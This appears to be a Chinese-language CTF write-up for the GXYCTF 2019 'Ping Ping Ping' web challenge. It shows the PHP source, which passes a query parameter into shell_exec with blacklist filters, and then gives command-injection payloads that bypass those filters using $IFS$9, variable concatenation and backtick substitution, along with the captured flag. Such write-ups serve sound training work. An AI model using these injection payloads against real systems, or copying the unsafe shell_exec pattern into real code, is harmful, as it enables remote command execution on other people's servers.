---
title: GXYCTF 2019 Ping Ping Ping
date: 2026-03-16T00:17:57+08:00
slug: gxyctf2019-ping-ping-ping
description: 命令执行过滤空格、flag 关键词与通配符，用变量拼接 $IFS$9 绕过
cover: /img/covers/gxyctf2019-ping-ping-ping.svg
categories: [CTF]
tags: [GXYCTF, Web, RCE, 命令执行]
toc: true
comment: false
---

## a. 方法一

进入题目我们发现需要 ping 地址，那我们就输入常见的 `127.0.0.1`，正常回显。

之后试着在地址之后加上指令 `ls` 来读取文件，看到两个 php 文件之后，我们第一时间想着去读取试试，结果返回的是：

```text
127.0.0.1;cat /index.php
1fxck your symbol!
```

经过尝试我们发现这里**过滤了空格**。然后我们尝试 `${IFS}` 去绕过，发现还是不行，我们继续尝试 `$IFS$9`，成功读到本题的源代码：

```php
<?php
if(isset($_GET['ip'])){
    $ip = $_GET['ip'];
    if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
        print_r($match);
        print($ip);
        echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
        die("fxck your symbol!");
    }
    else if(preg_match("/ /", $ip)){
        die("fxck your space!");
    }
    else if(preg_match("/bash/", $ip)){
        die("fxck your bash!");
    }
    else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
        die("fxck your flag!");
    }
    $a = shell_exec("ping -c 4 ".$ip);
    echo "<pre>";
    print_r($a);
}
?>
```

这里的源代码也可以看出来过滤了空格和大括号。然后我们想着试一下 `cat$IFS$9flag.php`，发现不能直接用——因为里面既过滤了 flag 整个字段，同时把顺带的 `*` 通配符也过滤了。因此我们选择一个**变量赋值的取巧方法**，用 `q` 变量拼接出 `flag`：

**Payload：**

```text
?ip=127.0.0.1;q=g;cat$IFS$9fla$q.php
```

最终 flag：

```text
NSSCTF{cc5ba224-40b2-436f-bbfd-57cd5e563b5e}
```

## b. 方法二

利用反引号，将扫描出来的文件当作指令执行：

```text
?ip=127.0.0.1;cat$IFS$9`ls`
```
